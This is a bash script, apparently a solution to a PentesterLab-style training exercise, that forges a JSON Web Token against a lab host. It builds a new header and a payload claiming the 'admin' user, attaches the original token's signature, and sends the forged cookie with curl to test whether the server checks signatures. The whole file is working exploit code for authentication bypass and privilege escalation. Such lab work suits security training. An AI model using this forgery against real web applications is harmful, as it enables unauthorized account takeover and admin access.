#!/bin/bash

# try a request with the original auth cookie
curl -i -k -X GET -b "auth=$(cat token.txt)" 'http://ptl-d87b0a26-93322644.libcurl.so/'

# just reuse the original signature with new data!
echo -n '{"typ":"JWT","alg":"HS256"}' | basenc --base64url -w 0 > data.txt
echo -n '{"username":"admin","iat":1676119346}' | basenc --base64url -w 0 | (echo -n '.' && cat) >> data.txt
perl -pi -e 's#=##g' data.txt
cut -d '.' -f 3 < token.txt | (echo -n '.' && cat) | cat data.txt - | perl -pe 'chomp' > token.evil.txt

# send to the server
curl -i -k -X GET -b "auth=$(cat token.evil.txt)" 'http://ptl-d87b0a26-93322644.libcurl.so/'
